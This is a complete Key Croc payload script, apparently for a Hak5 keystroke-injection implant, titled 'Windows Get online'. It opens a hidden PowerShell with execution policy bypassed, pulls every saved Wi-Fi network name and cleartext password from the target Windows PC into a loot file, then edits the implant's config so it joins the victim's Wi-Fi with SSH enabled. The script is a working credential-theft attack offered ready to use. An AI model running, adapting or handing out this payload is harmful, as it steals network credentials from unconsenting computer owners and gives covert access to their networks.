# Title:           Windows Get online   
# Description:     Get online automatically to target pc wifi or to your own wifi
# Author:          spywill
# Version:         2.0
# Category:        Key Croc
# Props:           Darren Kitchen, RootJunky, Cribbit, Lodrix, potong
#
#
MATCH getonline
Q LOCK
LED ATTACK
# --> udisk unmount
ATTACKMODE HID STORAGE
sleep 5
Q GUI r
sleep 0.5
# --> Open powershell
Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
Q ENTER
sleep 0.5
# --> Get KeyCroc drive
LED ATTACK
Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
Q ENTER
sleep 1
# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\loot\wifipass.txt\""
Q ENTER
sleep 2
Q STRING "exit"
Q ENTER
# --> Returning to HID Mode
ATTACKMODE HID
sleep 5
LED SETUP
# --> Remone any existing WIFI setting
Q STRING "$(sed -i -e '/^[WS]/d' /root/udisk/config.txt)"
Q ENTER
sleep 1
# --> Edit config.txt with sed
Q STRING "$(sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt)"
Q ENTER
sleep 0.5
# --> Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed
Q STRING "$(sed -E -i '1{x;s#^#sed -n 4p root/udisk/loot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' root/udisk/config.txt)"
Q ENTER
sleep 2
# --> Remove \r end lines in config.txt file
Q STRING "$(sed -i 's/\r//g' root/udisk/config.txt)"
Q ENTER
sleep 2
Q UNLOCK
LED FINISH